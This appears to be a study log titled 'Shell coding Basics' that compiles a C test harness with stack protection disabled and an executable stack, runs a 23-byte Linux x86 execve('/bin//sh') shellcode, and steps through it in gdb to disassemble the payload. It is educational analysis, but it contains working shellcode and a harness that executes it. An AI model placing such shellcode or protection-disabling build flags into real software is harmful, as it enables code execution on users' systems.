@@ -1,0 +1,120 @@
+Shell coding Basics
+
+http://shell-storm.org/shellcode/files/shellcode-827.php
+
+1.) Compile and run
+kan1shka9@dev:~/Desktop/AL/14$ ls
+shellcode.c
+kan1shka9@dev:~/Desktop/AL/14$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+kan1shka9@dev:~/Desktop/AL/14$ ls
+shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/AL/14$ ./shellcode
+Shellcode length: 23
+$ whoami
+kan1shka9
+
+2.) Single step and analyse the shellcode
+kan1shka9@dev:~/Desktop/AL/14$ gdb -q ./shellcode
+Reading symbols from ./shellcode...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) break main
+Breakpoint 1 at 0x8048450
+(gdb) run
+Starting program: /home/kan1shka9/Desktop/AL/14/shellcode
+di
+Breakpoint 1, 0x08048450 in main ()
+(gdb) disassemble
+Dump of assembler code for function main:
+   0x0804844d <+0>:     push   ebp
+   0x0804844e <+1>:     mov    ebp,esp
+=> 0x08048450 <+3>:     and    esp,0xfffffff0
+   0x08048453 <+6>:     sub    esp,0x20
+   0x08048456 <+9>:     mov    DWORD PTR [esp],0x804a024
+   0x0804845d <+16>:    call   0x8048330 <strlen@plt>
+   0x08048462 <+21>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048466 <+25>:    mov    DWORD PTR [esp],0x8048520
+   0x0804846d <+32>:    call   0x8048310 <printf@plt>
+   0x08048472 <+37>:    mov    DWORD PTR [esp+0x1c],0x804a024
+   0x0804847a <+45>:    mov    eax,DWORD PTR [esp+0x1c]
+   0x0804847e <+49>:    call   eax
+   0x08048480 <+51>:    leave
+   0x08048481 <+52>:    ret
+End of assembler dump.
+(gdb) shell cat shellcode.c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+main()
+{
+
+    printf("Shellcode length: %d\n", strlen(code));
+
+    int (*ret)() = (int(*)())code;
+
+    ret();
+
+}
+(gdb) print /x &code
+$1 = 0x804a024
+(gdb) x/xw 0x804a024
+0x804a024 <code>:       0x6850c031
+(gdb) x/xb 0x804a024
+0x804a024 <code>:       0x31
+(gdb) x/23xb 0x804a024
+0x804a024 <code>:       0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a02c <code+8>:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a034 <code+16>:    0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80
+(gdb) break *0x0804847e
+Breakpoint 2 at 0x804847e
+(gdb) c
+Continuing.
+Shellcode length: 23
+
+Breakpoint 2, 0x0804847e in main ()
+(gdb) disassemble
+Dump of assembler code for function main:
+   0x0804844d <+0>:     push   ebp
+   0x0804844e <+1>:     mov    ebp,esp
+   0x08048450 <+3>:     and    esp,0xfffffff0
+   0x08048453 <+6>:     sub    esp,0x20
+   0x08048456 <+9>:     mov    DWORD PTR [esp],0x804a024
+   0x0804845d <+16>:    call   0x8048330 <strlen@plt>
+   0x08048462 <+21>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048466 <+25>:    mov    DWORD PTR [esp],0x8048520
+   0x0804846d <+32>:    call   0x8048310 <printf@plt>
+   0x08048472 <+37>:    mov    DWORD PTR [esp+0x1c],0x804a024
+   0x0804847a <+45>:    mov    eax,DWORD PTR [esp+0x1c]
+=> 0x0804847e <+49>:    call   eax
+   0x08048480 <+51>:    leave
+   0x08048481 <+52>:    ret
+End of assembler dump.
+(gdb) print /x $eax
+$2 = 0x804a024
+(gdb) x/23xb 0x804a024
+0x804a024 <code>:       0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
+0x804a02c <code+8>:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
+0x804a034 <code+16>:    0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80
+(gdb) break *0x804a024
+Breakpoint 3 at 0x804a024
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x0804a024 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a024 <+0>:     xor    eax,eax
+   0x0804a026 <+2>:     push   eax
+   0x0804a027 <+3>:     push   0x68732f2f
+   0x0804a02c <+8>:     push   0x6e69622f
+   0x0804a031 <+13>:    mov    ebx,esp
+   0x0804a033 <+15>:    push   eax
+   0x0804a034 <+16>:    push   ebx
+   0x0804a035 <+17>:    mov    ecx,esp
+   0x0804a037 <+19>:    mov    al,0xb
+   0x0804a039 <+21>:    int    0x80
+   0x0804a03b <+23>:    add    BYTE PTR [eax],al
+End of assembler dump.
